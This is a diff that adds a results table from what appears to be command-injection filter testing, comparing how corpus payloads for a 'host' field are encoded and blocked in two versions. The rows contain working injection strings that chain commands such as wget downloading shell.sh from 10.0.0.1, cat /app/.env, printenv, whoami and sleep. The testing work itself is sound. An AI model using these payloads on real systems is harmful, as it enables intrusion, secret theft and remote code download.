@@ -1,0 +1,16 @@
+| id | payload (corpus) | body train (urlencode) | body 0.1.1 (raw) | servidor ve (train) | servidor ve (0.1.1) | train | 0.1.1 |
+|---|---|---|---|---|---|---|---|
+| cmdi_7 | `127.0.0.1%26wget http://10.0.0.1/shell.sh -O /tmp/s.sh //` | `host=127.0.0.1%2526wget+http%3A%2F%2F10.0.0.1%2Fshell.sh+-O+%2Ftmp%2Fs.sh+%2F%2F` | `host=127.0.0.1%26wget http://10.0.0.1/shell.sh -O /tmp/s.sh //` | `127.0.0.1%26wget http://10.0.0.1/shell.sh -O /tmp/s.sh //` | `127.0.0.1&wget http://10.0.0.1/shell.sh -O /tmp/s.sh //` | 403 / blocked | error / no |
+| cmdi_9 | `127.0.0.1%26printenv` | `host=127.0.0.1%2526printenv` | `host=127.0.0.1%26printenv` | `127.0.0.1%26printenv` | `127.0.0.1&printenv` | 403 / blocked | 200 / no |
+| cmdi_28 | `127.0.0.1%0ahostname %23` | `host=127.0.0.1%250ahostname+%2523` | `host=127.0.0.1%0ahostname %23` | `127.0.0.1%0ahostname %23` | `127.0.0.1
+hostname #` | 403 / blocked | 200 / no |
+| cmdi_38 | `127.0.0.1|&sleep 10 %23` | `host=127.0.0.1%7C%26sleep+10+%2523` | `host=127.0.0.1|&sleep 10 %23` | `127.0.0.1|&sleep 10 %23` | `127.0.0.1|` | 403 / blocked | 200 / no |
+| cmdi_40 | `127.0.0.1%7cprintenv` | `host=127.0.0.1%257cprintenv` | `host=127.0.0.1%7cprintenv` | `127.0.0.1%7cprintenv` | `127.0.0.1|printenv` | 403 / blocked | 200 / no |
+| cmdi_66 | `127.0.0.1;;wget http://10.0.0.1/shell.sh -O /tmp/s.sh %23` | `host=127.0.0.1%3B%3Bwget+http%3A%2F%2F10.0.0.1%2Fshell.sh+-O+%2Ftmp%2Fs.sh+%2523` | `host=127.0.0.1;;wget http://10.0.0.1/shell.sh -O /tmp/s.sh %23` | `127.0.0.1;;wget http://10.0.0.1/shell.sh -O /tmp/s.sh %23` | `127.0.0.1;;wget http://10.0.0.1/shell.sh -O /tmp/s.sh #` | 403 / blocked | 200 / no |
+| cmdi_100 | `127.0.0.1;sleep 10 %23` | `host=127.0.0.1%3Bsleep+10+%2523` | `host=127.0.0.1;sleep 10 %23` | `127.0.0.1;sleep 10 %23` | `127.0.0.1;sleep 10 #` | 200 / no | 403 / blocked |
+| cmdi_112 | `127.0.0.1%26net user` | `host=127.0.0.1%2526net+user` | `host=127.0.0.1%26net user` | `127.0.0.1%26net user` | `127.0.0.1&net user` | 403 / blocked | 200 / no |
+| cmdi_120 | `127.0.0.1%7cwhoami` | `host=127.0.0.1%257cwhoami` | `host=127.0.0.1%7cwhoami` | `127.0.0.1%7cwhoami` | `127.0.0.1|whoami` | 403 / blocked | 200 / no |
+| cmdi_152 | `127.0.0.1%3bcat /app/.env` | `host=127.0.0.1%253bcat+%2Fapp%2F.env` | `host=127.0.0.1%3bcat /app/.env` | `127.0.0.1%3bcat /app/.env` | `127.0.0.1;cat /app/.env` | 200 / no | 403 / blocked |
+| cmdi_155 | `127.0.0.1%3B%3Bwget%20http%3A%2F%2F10.0.0.1%2Fshell.sh%20-O%20%2Ftmp%2Fs.sh%20%23` | `host=127.0.0.1%253B%253Bwget%2520http%253A%252F%252F10.0.0.1%252Fshell.sh%2520-O%2520%252Ftmp%252Fs.sh%2520%2523` | `host=127.0.0.1%3B%3Bwget%20http%3A%2F%2F10.0.0.1%2Fshell.sh%20-O%20%2Ftmp%2Fs.sh%20%23` | `127.0.0.1%3B%3Bwget%20http%3A%2F%2F10.0.0.1%2Fshell.sh%20-O%20%2Ftmp%2Fs.sh%20%23` | `127.0.0.1;;wget http://10.0.0.1/shell.sh -O /tmp/s.sh #` | 403 / blocked | 200 / no |
+| cmdi_185 | `127.0.0.1%26cat /app/.env %23` | `host=127.0.0.1%2526cat+%2Fapp%2F.env+%2523` | `host=127.0.0.1%26cat /app/.env %23` | `127.0.0.1%26cat /app/.env %23` | `127.0.0.1&cat /app/.env #` | 403 / blocked | 200 / no |
+| cmdi_192 | `127.0.0.1|sleep 10 %23` | `host=127.0.0.1%7Csleep+10+%2523` | `host=127.0.0.1|sleep 10 %23` | `127.0.0.1|sleep 10 %23` | `127.0.0.1|sleep 10 #` | 200 / no | 403 / blocked |
